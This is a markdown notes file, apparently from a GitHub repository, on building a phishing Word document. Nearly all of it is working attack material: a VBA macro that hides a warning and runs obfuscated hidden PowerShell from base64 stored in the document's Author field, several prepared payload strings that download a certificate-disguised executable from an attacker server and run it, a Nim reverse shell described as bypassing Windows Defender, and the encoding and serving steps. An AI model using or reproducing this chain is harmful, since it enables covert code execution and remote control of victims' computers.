# Macro creation for phishing
![2023-11-06 09_04_47-Performance and Salaries docm - Word](https://github.com/bilkoh/notes_from_underground/assets/43228593/760a4c20-8205-4f12-a86e-a8327ff5cec9)

# InkPicture Macro Route
https://gist.github.com/mgeeky/6097ea56e0f541aa7d98161e2aa76dfb
https://www.whiteoaksecurity.com/blog/alternative-execution-macro-saga-inkpicture-part-1/

## This is the macro
```VB
Public Once As Integer
Private Sub DeleteWarningShape(ByVal textBoxName As String, ByVal saveDocAfter As Boolean)
    Dim shape As Word.shape
    On Error Resume Next
    For Each shape In ActiveDocument.Shapes
        If StrComp(shape.Name, textBoxName) = 0 Then
            'shape.Delete
            shape.Visible = msoFalse
            Exit For
        End If
    Next
    If saveDocAfter Then
        ActiveDocument.Save
    End If
End Sub

Public Sub Launch()
    On Error Resume Next
    DeleteWarningShape "**warning-div**", False
    
    Dim authorProperty As String
    authorProperty = ActiveDocument.BuiltInDocumentProperties("Author")
    Set objWShell = CreateObject("WScr" & "ipt.S" & "hell")
    
    Dim encode As String
    enccode = authorProperty
    
    Dim str As String
    str = "powe" & "rsh" & "ell.exe -no" & "p -w" & "indowstyle hid" & "den -co" & "mmand " & """$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\""" & enccode & "\"")); Invoke-Expression $decodedCommand"""
    
    objWShell.Exec (str)
End Sub

Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.InkRectangle)
    If Once < 1 Then
        Launch
    End If
    Once = Once + 1
End Sub
```

## Changing the author of the doc to string of powershell commands
What it looks like decoded
```PowerShell
powershell -ep bypass -Command "(new-object Net.WebClient).DownloadFile('http://192.168.56.102:8034/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.exe; %TEMP%\encoded.exe"
```
Convert it to base64 (to avoid parsing errors, run this in cmd.exe not powershell)
```PowerShell
powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"(new-object Net.WebClient).DownloadFile('http://192.168.56.102:8034/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.exe; %TEMP%\encoded.exe 192.168.56.102 3334\"))"
```

Output:
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUANgAuADEAMAAyADoAOAAwADMANAAvAGUAbgBjAG8AZABlAGQALgBjAHIAdAAnACwAJwBDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAnACkAOwBjAGUAcgB0AHUAdABpAGwAIAAtAGQAZQBjAG8AZABlACAAQwA6AFwAVQBzAGUAcgBzAFwAYgBpAGwAYQBsAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABlAG4AYwBvAGQAZQBkAC4AYwByAHQAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQA7ACAAQwA6AFwAVQBzAGUAcgBzAFwAYgBpAGwAYQBsAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABlAG4AYwBvAGQAZQBkAC4AZQB4AGUAIAAxADkAMgAuADEANgA4AC4ANQA2AC4AMQAwADIAIAAzADMAMwA0AA==
```

### Generating author strings for different ips
Run to convert
```PowerShell
powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"(new-object Net.WebClient).DownloadFile('http://10.0.254.201:8034/encoded.crt','%TEMP%\encoded.crt');certutil -decode %TEMP%\encoded.crt %TEMP%\encoded.exe; %TEMP%\encoded.exe 10.0.254.201 3334\"))"
```

#### 10.0.254.201
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADEAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAAxACAAMwAzADMANAA=
```

#### 10.0.254.202
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADIAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAAyACAAMwAzADMANAA=
```

#### 10.0.254.203
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADMAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAAzACAAMwAzADMANAA=
```

#### 10.0.254.204
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADQAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAA0ACAAMwAzADMANAA=
```

#### 10.0.254.205
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADUAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAA1ACAAMwAzADMANAA=
```

#### 10.0.254.206
```
KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADIANQA0AC4AMgAwADYAOgA4ADAAMwA0AC8AZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcALAAnAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGMAcgB0ACcAKQA7AGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAGIAaQBsAGEAbABcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAZQBuAGMAbwBkAGUAZAAuAGUAeABlADsAIABDADoAXABVAHMAZQByAHMAXABiAGkAbABhAGwAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcAGUAbgBjAG8AZABlAGQALgBlAHgAZQAgADEAMAAuADAALgAyADUANAAuADIAMAA2ACAAMwAzADMANAA=
```



The above output will be the base64 string we'll dump into author.

Other testing converting to and form base64 in powershell:
```VB
powershell -ep bypass -command "[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(\"calc.exe\"))"

YwBhAGwAYwAuAGUAeABlAA==

powershell -ep bypass -command "$decodedCommand = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\"YwBhAGwAYwAuAGUAeABlAA==\")); Invoke-Expression $decodedCommand"
```

## bypassing Windows Defender

### using nim reverse shell
https://github.com/Sn1r/Nim-Reverse-Shell

Changed the code to accept ip and port from cli arguments
```Nim
#[ 
   Created by Sn1r
   https://github.com/Sn1r/
 ]#

import net, os, osproc, strutils

proc exe(c: string): string =
  result = execProcess("cm" & "d /c " & c)

var
  v = newSocket()

  # Change this
  v1 = if paramCount() >= 1: paramStr(1) else: "192.168.1.1"
  v2 = if paramCount() >= 2: paramStr(2) else: "8080"

  s4 = "Exiting.."
  s5 = "cd"
  s6 = "C:\\"

try:
  v.connect(v1, Port(parseInt(v2)))

  while true:
    v.send(os.getCurrentDir() & "> ")
    let c = v.recvLine()
    if c == "exit":
      v.send(s4)
      break

    if c.strip() == s5:
      os.setCurrentDir(s6)
    elif c.strip().startswith(s5):
      let d = c.strip().split(' ')[1]
      try:
        os.setCurrentDir(d)
      except OSError as b:
        v.send(repr(b) & "\n")
        continue
    else:
      let r = exe(c)
      v.send(r)

except:
  raise
finally:
  v.close
```

### need to encode it 
```bash
#!/bin/bash
OUTPUT_FILE=encoded.crt
PAYLOAD_FILE=pkcatcherror.exe

echo -----BEGIN CERTIFICATE----- > $OUTPUT_FILE
cat $PAYLOAD_FILE | base64 -w 0 >> $OUTPUT_FILE
echo -----END CERTIFICATE----- >> $OUTPUT_FILE

echo "Generated file: $OUTPUT_FILE"
```

#### execute it
```Bash
cat > gen_encoded_nim.sh
chmod +x gen_encoded_nim.sh
./gen_encoded_nim.sh
```
### set up http server to serve `encoded.crt`
```
sudo python3 -m http.server 8034
```

